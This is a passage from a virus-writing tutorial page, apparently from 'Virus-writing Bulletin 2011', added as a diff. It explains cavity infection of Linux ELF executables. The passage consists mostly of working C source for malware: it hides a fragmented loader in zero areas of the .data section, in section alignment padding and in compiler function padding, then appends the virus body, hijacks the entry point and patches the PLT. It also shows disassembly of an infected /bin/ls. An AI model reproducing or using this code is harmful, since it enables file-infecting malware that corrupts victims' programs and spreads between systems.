+        mprotect(plta & 0xfffff000, (plts + 4095) & 0xfffff000, PROT_READ|
+PROT_WRITE);
+        for (i = 16; i < plts; i += 16) {
+                *(uint16_t*)(plta + i + 0x0) = 0x25ff;
+                *(uint32_t*)(plta + i + 0x2) = gotp;
+                *(uint8_t *)(plta + i + 0x6) = 0x68;
+                *(uint32_t*)(plta + i + 0x7) = orel;
+                *(uint8_t *)(plta + i + 0xb) = 0xe9;
+                *(uint32_t*)(plta + i + 0xc) = jmp1;
+                jmp1 -= 16;
+                gotp += 4;
+                orel += 8;
+        }
+        mprotect(plta & 0xfffff000, (plts + 4095) & 0xfffff000, PROT_READ|
+PROT_EXEC);
+
+        /* adjust return address */
+        *(uint32_t*)(&esp - 1) = (nloc + 5);
+
+   This method is used in the Linux.PiLoT
+
+  Zeroes in the data section
+
+   Let's look in the ls' data section:
+$ objdump -s -j .data /bin/ls
+
+/bin/ls:     file format elf32-i386
+
+Contents of section .data:
+805c720 00000000 00000000 0cc00508 00000000  ................
+805c730 00000080 ffffffff 01000000 01000000  ................
+805c740 01000000 00000000 01000000 ffffffff  ................
+805c750 00000000 00000000 00000000 00000000  ................
+805c760 02000000 dc7f0508 01000000 df7f0508  ................
+805c770 00000000 00000000 01000000 10ad0508  ................
+805c780 01000000 10ad0508 05000000 e17f0508  ................
+805c790 05000000 e77f0508 02000000 f67f0508  ................
+805c7a0 05000000 ed7f0508 05000000 f37f0508  ................
+805c7b0 05000000 f37f0508 00000000 00000000  ................
+805c7c0 00000000 00000000 05000000 f97f0508  ................
+805c7d0 05000000 ed7f0508 05000000 ff7f0508  ................
+805c7e0 05000000 05800508 05000000 0b800508  ................
+805c7f0 05000000 11800508 17800508 21800508  ............!...
+805c800 01000000 70340508 01000000 01000000  ....p4..........
+805c810 00010000 a0ca0508 10c80508 34b00508  ............4...
+
+   Large number of zeroes. Why not to write there the loader instead? It
+   is scarcely possible to write it completely, but it is real to write to
+   this areas the separate instructions and link them together with jmp
+   instrcutions. In order to do that, the virus needs the code of loader,
+   number of commands and their lengths:
+void mk_data(uint8_t *loader, uint8_t *length)
+{
+        *(uint32_t*)(loader + 0x00) = 0x5c8b9560;
+        *(uint32_t*)(loader + 0x04) = 0x00682424;
+        *(uint32_t*)(loader + 0x08) = 0x89000000;
+        *(uint32_t*)(loader + 0x0c) = 0xcd05b0c1;
+        *(uint32_t*)(loader + 0x10) = 0x51415080;
+        *(uint32_t*)(loader + 0x14) = 0x51495150;
+        *(uint32_t*)(loader + 0x18) = 0x5ab0e389;
+        *(uint32_t*)(loader + 0x1c) = 0xe0ff80cd;
+
+        *(uint16_t*)(length + 0x00) = 0x4511;
+        *(uint16_t*)(length + 0x02) = 0x2122;
+        *(uint16_t*)(length + 0x04) = 0x1111;
+        *(uint16_t*)(length + 0x06) = 0x2211;
+        *(uint16_t*)(length + 0x08) = 0x0022;
+}
+
+        uint8_t loader[32], length[10];
+        ...
+        /* prepare data */
+        mk_data(loader, length);
+        int i, l;
+        uint8_t *p = loader;
+        for (i = 0; i < LCMDS; i++) {
+                l = length[i / 2];
+                l = i % 2 == 0 ? l >> 4 : l & 15;
+                g->loader[i].len = l;
+                g->loader[i].ptr = p;
+                g->loader[i].next = NULL;
+                if (i > 0)
+                        g->loader[i - 1].next = &g->loader[i];
+                p += l;
+        }
+
+   Put the loader instructions to the linked list.
+
+   Search for the data section by name:
+        if (ehdr->e_shstrndx == SHN_UNDEF)
+                goto _unmap;
+        char *name, *strtab = m + shdr[ehdr->e_shstrndx].sh_offset;
+        for (i = 0; i < ehdr->e_shnum; i++) {
+                name = strtab + shdr[i].sh_name;
+                if (*(uint32_t*)name == 0x7461642e && *(uint16_t*)(name + 
+4) == 0x0061)
+                        break;
+        }
+
+   And now let's find all areas filled with zeroes and save it to the list
+   too:
+/* examples/Cavity.Data/check_range.c */
+static cell_t *check_range(uint8_t *start, uint8_t *end)
+{
+        cell_t *list = NULL;
+        uint8_t *ptr = start;
+        int c = 0;
+        while (ptr < end) {
+                if (*ptr == 0)
+                        c++;
+                else {
+                        if (c >= 6) {
+                                cell_t *q, *tmp;
+                                if ((tmp = malloc(sizeof(cell_t))) == NULL
+) {
+                                        free_list(list);
+                                        return NULL;
+                                }
+                                tmp->ptr = ptr - c;
+                                tmp->len = c;
+                                tmp->next = NULL;
+                                if (list == NULL || tmp->len > list->len) 
+{
+                                        tmp->next = list;
+                                        list = tmp;
+                                } else {
+                                        q = list;
+                                        while (q->next != NULL && q->next-
+>len > tmp->len)
+                                                q = q->next;
+                                        tmp->next = q->next;
+                                        q->next = tmp;
+                                }
+                        }
+                        c = 0;
+                }
+                ptr++;
+        }
+        return list;
+}
+        free_space = check_range(m, shdr[i].sh_offset, shdr[i].sh_offset +
+ shdr[i].sh_size);
+        if (free_space == NULL)
+                goto _unmap;
+
+   The list is sorted by size.
+
+   I needed the malloc() and free() functions. I pick the ready from the
+   K&R (chapter 8).
+/* examples/h/malloc.h */
+#define NALLOC  1024                    /* minimum #units to request */
+typedef long Align;                     /* for alignment to long boundary 
+*/
+union header {                          /* block header */
+        struct {
+                union header *ptr;      /* next block if on free list */
+                unsigned size;          /* size of this block */
+        } s;
+        Align x;                        /* force alignment of blocks */
+};
+typedef union header Header;
+
+//static Header base;                   /* empty list to get started */
+//static Header *freep = NULL;          /* start of free list */
+
+static Header *morecore(unsigned nu);
+static void *malloc(unsigned nbytes);
+static void free(void *ap);
+/* examples/h/malloc.c */
+char *sbrk(int inc)
+{
+        char *r;
+        if (g->lastbrk == NULL) {
+                g->lastbrk = (char*)brk(0);
+                g->savebrk = g->lastbrk;
+        }
+        r = g->lastbrk;
+        g->lastbrk = (char*)brk(g->lastbrk + inc);
+        if (g->lastbrk != (r + inc))
+                return (char*)-1;
+        return r;
+}
+
+/* morecore: ask system for more memory */
+static Header *morecore(unsigned nu)
+{
+        char *cp, *sbrk(int);
+        Header *up;
+
+        if (nu < NALLOC)
+                nu = NALLOC;
+        cp = sbrk(nu * sizeof(Header));
+        if (cp == (char *) -1)                          /* no space at all
+ */
+                return NULL;
+        up = (Header *) cp;
+        up->s.size = nu;
+        free((void *)(up+1));
+        return g->freep;
+}
+
+/* malloc: general-purpose storage allocator */
+static void *malloc(unsigned nbytes)
+{
+        Header *p, *prevp;
+        unsigned nunits;
+
+        nunits = (nbytes+sizeof(Header)-1)/sizeof(union header) + 1;
+        if ((prevp = g->freep) == NULL) {                       /* no free
+ list yet */
+                g->base.s.ptr = g->freep = prevp = &g->base;
+                g->base.s.size = 0;
+        }
+        for (p = prevp->s.ptr; ; prevp = p, p = p->s.ptr) {
+                if (p->s.size >= nunits) {              /* big enough */
+                        if (p->s.size == nunits)        /* exactly */
+                                prevp->s.ptr = p->s.ptr;
+                        else {                          /* allocate tail e
+nd */
+                                p->s.size -= nunits;
+                                p += p->s.size;
+                                p->s.size = nunits;
+                        }
+                        g->freep = prevp;
+                        return (void *)(p+1);
+                }
+                if (p == g->freep)                              /* wrapped
+ around free list */
+                        if ((p = morecore(nunits)) == NULL)
+                                return NULL;            /* none left */
+        }
+}
+
+/* free: put block ap in free list */
+static void free(void *ap)
+{
+        Header *bp, *p;
+
+        bp = (Header *)ap - 1;                          /* point to block 
+header */
+        for (p = g->freep; !(bp > p && bp < p->s.ptr); p = p->s.ptr)
+                if (p >= p->s.ptr && (bp > p || bp < p->s.ptr))
+                        break;                          /* freed block at 
+start or end of arena */
+
+        if (bp + bp->s.size == p->s.ptr) {              /* join to upper n
+br */
+                bp->s.size += p->s.ptr->s.size;
+                bp->s.ptr = p->s.ptr->s.ptr;
+        } else
+                bp->s.ptr = p->s.ptr;
+        if (p + p->s.size == bp) {                      /* join to lower n
+br */
+                p->s.size += bp->s.size;
+                p->s.ptr = bp->s.ptr;
+        } else
+                p->s.ptr = bp;
+        g->freep = p;
+}
+
+   Now the virus will fix the offset within loader, put the loader's
+   intructions instead of found zeroes, write virus body and fix the entry
+   point:
+/* examples/Cavity.Data/insert_virus.c */
+static int insert_virus(cell_t *i, cell_t *c)
+{
+        int l;
+        for (l = 0; c != NULL; )
+                if (l + c->len <= (c->next ? i->len - 5 : i->len)) {
+                        memcpy(i->ptr + l, c->ptr, c->len);
+                        l += c->len;
+                        c = c->next;
+                } else {
+                        int n;
+                        for (n = l; n < i->len; n++)
+                                i->ptr[n] = 0x90;
+                        if (i->next != NULL) {
+                                *((uint8_t *)(i->ptr + l)) = 0xe9;
+                                *((uint32_t*)(i->ptr + l + 1)) = i->next->
+ptr - i->ptr - l - 5;
+                        } else {
+                                return 1;
+                        }
+                        i = i->next;
+                        l = 0;
+                }
+        return 0;
+}
+        uint32_t nl = (l + 4095) & 0xfffff000;
+        /* patch loader */
+        *(uint32_t*)(g->loader[3].ptr + 1) = nl;
+        if (insert_virus(free_space, g->loader) != 0) {
+                /* clean the file */
+                cell_t *tmp;
+                for (tmp = free_space; tmp; tmp = tmp->next)
+                        bzero(tmp->ptr, tmp->len);
+                goto _unmap;
+        }
+        ftruncate(h, nl);
+        lseek(h, 0, 2);
+        write(h, g->self, g->size);
+        pwrite(h, &ehdr->e_entry, 4, nl + 10, 0);
+        ehdr->e_entry = ((char*)free_space->ptr - m) - shdr[i].sh_offset +
+ shdr[i].sh_addr;
+
+   It is neccessary to clean the memory:
+/* examples/Cavity.Data/victim.c */
+#include <stdio.h>
+unsigned char test[32] = {
+        [0] = 1, [1 ... 14] = 0, [15] = 1,
+        [16] = 1, [17 ... 30] = 0, [31] = 1,
+};
+
+int main(int argc, char **argv)
+{
+        int i;
+        for (i = 0; i < 32; i++)
+                printf("%x ", test[i]);
+        putchar('\n');
+        return 0;
+}
+./victim
+1 89 e3 b0 5a cd 80 ff e0 0 0 0 0 0 0 1 1 cd 80 50 41 51 50 51 49 51 e9 e2
+ ff ff ff 1
+
+   To do that, write the pairs <address, size> of those areas that would
+   be cleared after our code (in infect()): cell_t *t; uint32_t x; for (t
+   = free_space; t; t = t->next) if (*t->ptr != 0) { x = ((char*)t->ptr -
+   m) - shdr[i].sh_offset + shdr[i].sh_addr; write(h, &x, 4); write(h,
+   &t->len, 4); }
+
+   In virus():
+   /*  clean  the  loader  from  data  segment  */  uint32_t *data =
+   (uint32_t*)(g->self + g->size); for (i = 0; data[i] != 0; i += 2)
+   bzero(data[i], data[i + 1]);
+
+   All right now:
+./victim
+1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1
+
+  Section's alignment
+
+   The vast majority of the sections has alignment requirements, the
+   beginning of the section must be rounded to a specific value. To fulfil
+   this constraint, the previous section is padded with zeroes. There are
+   not too much space in this paddings, but sometimes enough to fit a
+   small code.
+
+   This  example is very similar to the previous one, but with a few
+   changes:
+     * In the search routine we\re looking for an alignment (difference
+       between the end of the section and the beginning of the next one):
+static cell_t *check_range(Elf32_Ehdr *ehdr, Elf32_Shdr *shdr)
+{
+...
+        for (i = 1; i < ehdr->e_shnum; i++) {
+                if (shdr[i].sh_flags & SHF_ALLOC) {
+                        int f = shdr[i + 1].sh_offset - shdr[i].sh_offset 
+- shdr[i].sh_size;
+                        if (f < 6)
+                                continue;
+
+     * We will require not only pointers, but addresses of the free spaces
+       too, because sections could be located in the different segments:
+static cell_t *check_range(Elf32_Ehdr *ehdr, Elf32_Shdr *shdr)
+{
+...
+                        tmp->ptr = (char*)ehdr + shdr[i].sh_offset + shdr[
+i].sh_size;
+                        tmp->len = f;
+                        tmp->adr = shdr[i].sh_addr + shdr[i].sh_size;
+       So, during insertion the jmp argument is calculated from addresses
+       not from pointers:
+static int insert_virus(cell_t *i, cell_t *c)
+{
+...
+                                *((uint32_t*)(i->ptr + l + 1)) = i->next->
+adr - i->adr - l - 5;
+     * Since nobody would use the space which we occupy there is no need
+       to clear it
+
+  Function alignment
+
+   To improve the perfomance the compiler would try to align the labels,
+   functions by padding the preceding code with meaningless instructions.
+   Here is the list of paddings used by binutils (gas/config/tc-i386.c):
+{0x90};                                     /* nop                  */
+{0x89,0xf6};                                /* movl %esi,%esi       */
+{0x8d,0x76,0x00};                           /* leal 0(%esi),%esi    */
+{0x8d,0x74,0x26,0x00};                      /* leal 0(%esi,1),%esi  */
+{0x90,                                      /* nop                  */
+ 0x8d,0x74,0x26,0x00};                      /* leal 0(%esi,1),%esi  */
+{0x8d,0xb6,0x00,0x00,0x00,0x00};            /* leal 0L(%esi),%esi   */
+{0x8d,0xb4,0x26,0x00,0x00,0x00,0x00};       /* leal 0L(%esi,1),%esi */
+{0x90,                                      /* nop                  */
+ 0x8d,0xb4,0x26,0x00,0x00,0x00,0x00};       /* leal 0L(%esi,1),%esi */
+{0x89,0xf6,                                 /* movl %esi,%esi       */
+ 0x8d,0xbc,0x27,0x00,0x00,0x00,0x00};       /* leal 0L(%edi,1),%edi */
+{0x8d,0x76,0x00,                            /* leal 0(%esi),%esi    */
+ 0x8d,0xbc,0x27,0x00,0x00,0x00,0x00};       /* leal 0L(%edi,1),%edi */
+{0x8d,0x74,0x26,0x00,                       /* leal 0(%esi,1),%esi  */
+ 0x8d,0xbc,0x27,0x00,0x00,0x00,0x00};       /* leal 0L(%edi,1),%edi */
+{0x8d,0xb6,0x00,0x00,0x00,0x00,             /* leal 0L(%esi),%esi   */
+ 0x8d,0xbf,0x00,0x00,0x00,0x00};            /* leal 0L(%edi),%edi   */
+{0x8d,0xb6,0x00,0x00,0x00,0x00,             /* leal 0L(%esi),%esi   */
+ 0x8d,0xbc,0x27,0x00,0x00,0x00,0x00};       /* leal 0L(%edi,1),%edi */
+{0x8d,0xb4,0x26,0x00,0x00,0x00,0x00,        /* leal 0L(%esi,1),%esi */
+ 0x8d,0xbc,0x27,0x00,0x00,0x00,0x00};       /* leal 0L(%edi,1),%edi */
+{0xeb,0x0d,0x90,0x90,0x90,0x90,0x90,        /* jmp .+15; lotsa nops */
+ 0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90};
+
+   This sequences could be found in the .text section, but to avoid the
+   false positives the search must be started on the instruction boundary.
+   The Intel instructions has complex format and in order to determine the
+   length of instruction correctly, the virus should use special library -
+   length disassembler. A length disassembler to the contrary to regular
+   ones  would not even try to recover the instruction mnemonics and
+   operands, but just returns the length of instruction or error, if the
+   input doesn't look like a machine code. There are many libraries of
+   that kind: LDE, RGBLDE, Catchy etc I will use MLDE32.
+/* examples/Cavity.Functions/check_range.c */
+static cell_t *check_range(uint8_t *start, uint8_t *end)
+{
+        cell_t *list = NULL;
+        uint8_t *ptr = start;
+        int op_len, i, s;
+        struct {
+                uint32_t len, crc;
+        } p[10];
+        p[0].len = 15; p[0].crc = 0x11d50a7f;
+        p[1].len = 14; p[1].crc = 0xe4ad564a;
+        p[2].len = 15; p[2].crc = 0xd5cae9dc;
+        p[3].len = 13; p[3].crc = 0xd6b6dcfd;
+        p[4].len = 12; p[4].crc = 0x19fbc1f4;
+        p[5].len = 11; p[5].crc = 0x34a6685b;
+        p[6].len = 10; p[6].crc = 0x74d8dd25;
+        p[7].len = 9;  p[7].crc = 0x6ed89f27;
+        p[8].len = 8;  p[8].crc = 0xb7109f48;
+        p[9].len = 7;  p[9].crc = 0x5d30a0da;
+        while (ptr < end) {
+_next:          for (i = 0; i < 10; i++)
+                        if (crc32(0, ptr, p[i].len) == p[i].crc) {
+                                cell_t *q, *tmp;
+                                if ((tmp = malloc(sizeof(cell_t))) == NULL
+) {
+_error:                                 free_list(list);
+                                        return NULL;
+                                }
+                                s = i == 2 ? 2 : 1;
+                                tmp->ptr = ptr + s;
+                                tmp->len = p[i].len - s;
+                                tmp->next = NULL;
+                                if (list == NULL || tmp->len > list->len) 
+{
+                                        tmp->next = list;
+                                        list = tmp;
+                                } else {
+                                        q = list;
+                                        while (q->next != NULL && q->next-
+>len > tmp->len)
+                                                q = q->next;
+                                        tmp->next = q->next;
+                                        q->next = tmp;
+                                }
+                                ptr += p[i].len;
+                                goto _next;
+                        }
+                if ((op_len = mlde32(ptr)) <= 0)        /* "Illegal instru
+ction! */
+                        goto _error;
+                ptr += op_len;
+        }
+        return list;
+}
+
+   To prevent the program from falling through to virus code, I will use
+   only  those  fragments  which  are  located  after the RET (0xC3)
+   instruction.
+
+   The search routine was changed (the section name is .text not .data)
+   and I had returned to the pointers again. No more changes.
+
+   Let's see how the infected file been changed:
+< /bin/ls:     file format elf32-i386
+---
+> ./ls:     file format elf32-i386
+4593,4594c4593,4598
+<  804d9c2:     8d b4 26 00 00 00 00    lea    0x0(%esi),%esi
+<  804d9c9:     8d bc 27 00 00 00 00    lea    0x0(%edi),%edi
+---
+>  804d9c2:     60                      pusha
+>  804d9c3:     95                      xchg   %eax,%ebp
+>  804d9c4:     8b 5c 24 24             mov    0x24(%esp),%ebx
+>  804d9c8:     b0 05                   mov    $0x5,%al
+>  804d9ca:     e9 93 83 00 00          jmp    8055d62 <close_stdout+0x242
+2>
+>  804d9cf:     90                      nop
+10307,10308c10311,10315
+<  8052aa2:     8d b4 26 00 00 00 00    lea    0x0(%esi),%esi
+<  8052aa9:     8d bc 27 00 00 00 00    lea    0x0(%edi),%edi
+---
+>  8052aa2:     b0 5a                   mov    $0x5a,%al
+>  8052aa4:     cd 80                   int    $0x80
+>  8052aa6:     ff e0                   jmp    *%eax
+>  8052aa8:     00 8d bc 27 00 00       add    %cl,0x27bc(%ebp)
+>  8052aae:     00 00                   add    %al,(%eax)
+10345,10346c10352,10359
+<  8052b02:     8d b4 26 00 00 00 00    lea    0x0(%esi),%esi
+<  8052b09:     8d bc 27 00 00 00 00    lea    0x0(%edi),%edi
+---
+>  8052b02:     51                      push   %ecx
+>  8052b03:     6a 04                   push   $0x4
+>  8052b05:     51                      push   %ecx
+>  8052b06:     49                      dec    %ecx
+>  8052b07:     51                      push   %ecx
+>  8052b08:     89 e3                   mov    %esp,%ebx
+>  8052b0a:     e9 93 ff ff ff          jmp    8052aa2 <strcpy@plt+0x8d06>
+>  8052b0f:     90                      nop
+14508,14509c14521,14525
+<  8055d62:     8d b4 26 00 00 00 00    lea    0x0(%esi),%esi
+<  8055d69:     8d bc 27 00 00 00 00    lea    0x0(%edi),%edi
+---
+>  8055d62:     cd 80                   int    $0x80
+>  8055d64:     68 00 60 01 00          push   $0x16000
+>  8055d69:     50                      push   %eax
+>  8055d6a:     41                      inc    %ecx
+>  8055d6b:     e9 92 cd ff ff          jmp    8052b02 <strcpy@plt+0x8d66>
+</pre>
+</div>
+<div id="endofpage"><div style="width:900px;margin:0pt auto;padding-top:5px;padding-bottom:5px">Virus-writing Bulletin 2011</div>
+</body>
+</html>
